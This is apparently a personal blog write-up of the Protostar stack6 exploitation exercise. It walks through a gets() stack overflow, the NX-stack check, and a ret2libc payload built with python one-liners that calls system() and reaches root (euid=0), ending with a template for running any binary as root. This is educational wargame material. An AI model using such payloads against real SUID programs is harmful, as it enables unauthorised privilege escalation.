# --[ Introduction ]

So here we are again, for some reason I decided to start looking into binary exploitation again. I haven't seen this kinda stuff for a few years, and I guess I kinda missed it. I decided to delve in again with protostar!

I am going to be laying out the thought process that I followed to solve Protostar Stack 6! This post will look at solving stack6 with a ret2libc attack, and a future one using ROP. Let's do it!

# --[ The Challenge ]

So the challenge is pretty straightforward in terms of finding out what we have to do, and we're left with finding out how to do it. In particular, the vulnerable code is in this function:

```c
 6 void getpath() {
 8  char buffer[64];
 9  unsigned int ret;
11  printf("input path please: "); fflush(stdout);
12
13  gets(buffer);
14
15  ret = __builtin_return_address(0);
17  if((ret & 0xbf000000) == 0xbf000000) {
18    printf("bzzzt (%p)\n", ret);
19    _exit(1);
20  }
22  printf("got path %s\n", buffer);
23 }
```

Why is this vulnerable?! From `man gets`

> gets() is equivalent to fgets() with an infinite size and a stream of stdin [...] It is the caller's responsibility to ensure that the input line, if any, is sufficiently short to fit in the string

In other words, `gets` will keep reading until it encounters a newline with no bounds checking of any kind (also mentioned in the security notes of the man-page). This in turn is good news for us, however looking at line 17 we see a strange check. 

The check at line 17 is making sure that the return address of `getpath` does not start with `0xbf`. What's so special about addresses beginning with `0xbf`, I hear you ask. It turns out that addresses beggning with `0xbffff` are part of the stack [1][2], so really this check is trying to enforce a NX (non-executable) stack, so we can't just good-'ol point EIP to our buffer and execute any shellcode we want from the stack.

# --[ NX-stack ]

What exactly is an NX-Stack and why would the stack be NX ?! It is a binary exploitation mitigation, introduced to counter stack-based buffer overflows [3], along with stack canaries[4]. The general idea is that by marking the stack as Readable, Writeable and Non-Executable the processor is prevented from executing instructions from the stack (and hence potentially malicious input). In contrast, memory regions that contain code and are marked as Read-Only and Executable to avoid modification.

So now the game is somewhat harder, we need to defeat the NX-stack. There are two ways to do this, and I did both just to check that I could. The first way is by returning to a libc function of choice, and the broader category is known as ret2libc attacks. When this is not possible, you can result to crafting a Return-Oriented Programming (ROP) payload, but this is considerably harder and more time consuming. Both of these techniques assume that ASLR [5] is not enabled (and from now on we will assume it to be true for the rest of the article). 

# --[ Exploitation Setup ]

To make things easier for us, we need to do three things:

* enable coredumps: `$ ulimit -c unlimited`.
* enable SUID coredumps: `# echo 2 >/proc/sys/fs/suid_dumpable`.
* find a debugging instruction in the binary.

These will allow us to inspect the process when it crashes or hits a breakpoint, allowing us to verify our logic step by step. Debugger interrupt is `int 3` or `0xCC`, and we can look for one using `objdump`:

```
$ objdump -s ./stack6 | grep -e cc
8048248 1a000000 cc850408 04000000 11001000  ................
                 ^- here
```

Bingo, we were lucky found a break point on `0x0804824c`. Conveniently, this is in the `.text` section of the binary, so we should be able to call it without issues. 

Now we need to make our binary crash, and by trying a few different offsets we find that 84 bytes are enough to overwrite EIP. Let's test this with our our breakpoint:

```bash
$ python -c 'print "A" * 80 + "\x4c\x82\x04\x08"' | ./stack6
input path please: got path AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAALAAAAAAAAAAAAL�
Trace/breakpoint trap (core dumped)
# gdb -q ./stack6 /tmp/core.5.stack6.1566 
Program terminated with signal 5, Trace/breakpoint trap.
#0  0x0804824d in ?? ()
(gdb) x/i $eip-1
0x804824c:	int3 
```

Another way to find this offset out would be to look at the assembly of the target function:

```arm
0x08048484 <getpath+0>:	    push   ebp
0x08048485 <getpath+1>:	    mov    ebp,esp
......
0x080484a4 <getpath+32>:	lea    eax,[ebp-0x4c]
0x080484a7 <getpath+35>:	mov    DWORD PTR [esp],eax      
0x080484aa <getpath+38>:	call   0x8048380 <gets@plt>
```

So we know that the stack exactly before `getpath` is called containes a return address (because of x86 calling conventions) and then we do a `push ebp`, increasing our offset from EIP by 4. After this, we see that `gets` (which expects a pointer to our buffer) is passed the address `ebp-0x4c` (`0x4c` is 76 in decimal), which tells us that our buffer starts at `ebp-0x4c`. Putting this together, we can see that our buffer is at `address_of_return_address_on_stack - 4 - 76`, making our total offset 80 bytes from the start of our buffer till we overwrite `getpath`'s return address on the stack. The diagram below shows the points of interest and the stack layout based on the conversation so far: 

```
 ________________ < ebp - 0x4c
|  our buffer    |
 ________________ < ebp 
|    old ebp     |
 ________________ < target no 1
| return address |
 ________________
| other things   |
| that don't     |
| matter         |
```

We now have a way to debug our logic, know what the memory layout looks like and can reliably trigger the bug!

# --[ Exploitation ]

So what actually is a ret2libc attack? This puzzled me for ages, but turns out it is reasonably straightforward. The idea is that basically after you take control of EIP  by means of an stack-based buffer overflow you can redirect the execution flow towards system functions found in libc. This is done by overwriting the return address stored on the stack with the your target function's entrypoint. This is the big picture, but of course there are more details to this and a very handy article to talk about this is [6].

In order to carry out our attack, we need to figure out the following:
* Which function to call ?!
* Where is the entrypoint of that ?!
* What does the stack need to look like or does it not matter (spoiler alert: it matters) ?!

Seeing as we are trying to escalate our priviledges, we should call the `system` function found in libc. Reading the manpage, `system` expects a command string to be supplied, so this will have to be somewhere on the stack as well! I will also include a call to `exit`, in order to honour the graceful-termination ethos amongst shellcoders. So then this is what we want the stack to look like

```
 ________________ < ebp - 0x4c
|  our buffer    |
|  should now    |
|  have /bin/sh  |
|  somewhere     |
 ________________ < ebp 
|    old ebp     |
 ________________
| system address |
 ________________
| exit   address |
 ________________
| pointer to     |
| /bin/sh        | 
 ________________
| other things   |
| that don't     |
| matter         |
```

Let's address the easy issues first, finding the addresses of `system` and `exit`. Using gdb:

```bash
(gdb) p system
$1 = {<text variable, no debug info>} 0xb7ecffb0 <__libc_system>
(gdb) p exit
$2 = {<text variable, no debug info>} 0xb7ec60c0 <*__GI_exit>
```

Now for the part that confused me the most: how TF do I find `/bin/sh`? I saw a lot of people do it online by using a secondary program to create a few environment variables, and also the same technique was used in the book The Shellcoder's Handbook. Seeing as I am lazy (and also the thought of having to debug other people's C...), however, I thought it would be useful to do it another way. Since the memory is super predictable, I can just pass in `/bin/sh` as part of the input, find it on the stack, and then pass that address in. Let's try!

So the stack now has to look like:
```
 ________________ < ebp - 0x4c
|  our buffer    |
 ________________ < ebp 
|    old ebp     |
 ________________
| system address |
 ________________
| exit   address |
 ________________
| pointer to     |
| /bin/sh        |
 ________________
| /bin/sh string |
 ________________
| other things   |
| that don't     |
| matter         |
```

```bash
$ python -c 'print "A" * 80 + "\x4c\x82\x04\x08" + "\x00\x00\x00\x00" + "\x00\x00\x00\x00" + "\x2f\x62\x69\x6e\x2f\x73\x68"' | ./stack6
input path please: got path AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAALAAAAAAAAAAAAL�
Trace/breakpoint trap (core dumped)
# gdb -q ./stack6 /tmp/core.5.stack6.1799
Program terminated with signal 5, Trace/breakpoint trap.
(gdb) x/4x $esp
0xbffff800:	0x00000000	0x00000000	0x6e69622f	0x0068732f
(gdb) x/s 0xbffff808
0xbffff808:	 "/bin/sh"
```

And this is where things went wrong for me. Turns out, as described in [1], that gdb will setup some additional environment variables and that will impact the actual offsets of addresses on the stack when you run outside gdb. So whilst in GDB the address is `0xbffff808`, outside gdb it was `0xbffff7f8`. Putting all of this together, we have:

```bash
$ python -c 'print "A" * 80 + "\xb0\xff\xec\xb7" + "\xc0\x60\xec\xb7" + "\xf8\xf7\xff\xbf" + "/usr/bin/id"'  | ./stack6
input path please: got path AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA���AAAAAAAAAAAA����`�����/usr/bin/id
uid=1001(user) gid=1001(user) euid=0(root) groups=0(root),1001(user)
```

Sweet! Since `/usr/bin/id` shows we are root, effectively any program we run will run as root. We can run any program we run as root by simply modifying our exploit to run our target binary instead of `/usr/bin/id` like this:

```bash
python -c 'print "A" * 80 + "\xb0\xff\xec\xb7" + "\xc0\x60\xec\xb7" + "\xf8\xf7\xff\xbf" + "/path/to/target"'
```

# --[ CLOSING THOUGHTS ]

Part one of this exploration is over! I hope I have inspired you to go play with protostar, learn more about binary exploitation and then tell your friends about it! 

Reading back at this article the steps seem to logically follow one another, but don't let this fool you. It took me days to get the ret2libc to work reliably. Some lessons that I learnt after hours of debugging:

* gdb will mess you around. Twice for me, once when I was looking for the offsets of my variable in ret2libc and then when I was trying to find out the libc base for my ROP-chain.
* all bytes are 8 bits, but not all bytes are equal. We were lucky here with exploiting `gets`, but in general we would not be able to freely put NULL bytes into the input.
* I wasted a lot of time trying to decide between python 2 and 3. God damn.

I strongly recommend reading material at the sources section, it will help you out a lot! See you on the next one, for more endless hours of debug....fun as we learn to do ROP-chains!

# --[ SOURCES ]

[1] - https://stackoverflow.com/a/17775966/1366384

[2] - https://www.coengoedegebure.com/buffer-overflow-attacks-explained/

[3] - https://en.wikipedia.org/wiki/Stack_buffer_overflow#Nonexecutable_stack

[4] - https://en.wikipedia.org/wiki/Stack_buffer_overflow#Stack_canaries

[5] - https://en.wikipedia.org/wiki/Stack_buffer_overflow#Randomization

[6] - https://www.shellblade.net/files/docs/ret2libc.pdf

[7] - https://security.stackexchange.com/questions/36462/

[8] - https://github.com/JonathanSalwan/ROPgadget